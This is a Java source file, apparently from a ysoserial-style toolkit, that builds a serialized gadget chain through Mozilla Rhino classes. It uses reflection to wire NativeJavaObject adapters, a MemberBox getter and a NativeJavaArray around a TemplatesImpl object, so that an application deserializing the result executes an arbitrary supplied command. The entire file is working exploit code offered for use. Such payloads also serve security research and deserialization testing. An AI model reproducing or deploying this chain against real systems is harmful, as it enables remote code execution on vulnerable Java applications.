import Utils.Gadgets;
import Utils.Reflections;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

@SuppressWarnings("unchecked")
public class Payload {
    public static Object getObject( String command) throws Exception {
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("org.mozilla.javascript.MemberBox"),
                (Class<Object>)Class.forName("org.mozilla.javascript.MemberBox"),
                new Class[] {Method.class},
                new Object[] {Context.class.getMethod("enter")});

        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("getSlot", Context.class, Object.class,
                Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess"));
        makeSlot.setAccessible(true);
        Object enumMakeGetter = Reflections.getField(Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess"), "MODIFY_GETTER_SETTER").get(null);
        Object slot = makeSlot.invoke(initContextScriptableObject, null,  "foo", enumMakeGetter);
        Reflections.setFieldValue(slot, "getter", initContextMemberBox);

        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject",
                Payload.class.getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        Object enumMakeSlot = Reflections.getField(Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess"), "MODIFY").get(null);
        makeSlot.invoke(scriptableObject, null, "outputProperties", enumMakeSlot);

        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(command));
        nativeJavaArray.setPrototype(scriptableObject);
        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                Payload.class.getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

        return nativeJavaObject;
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }
}
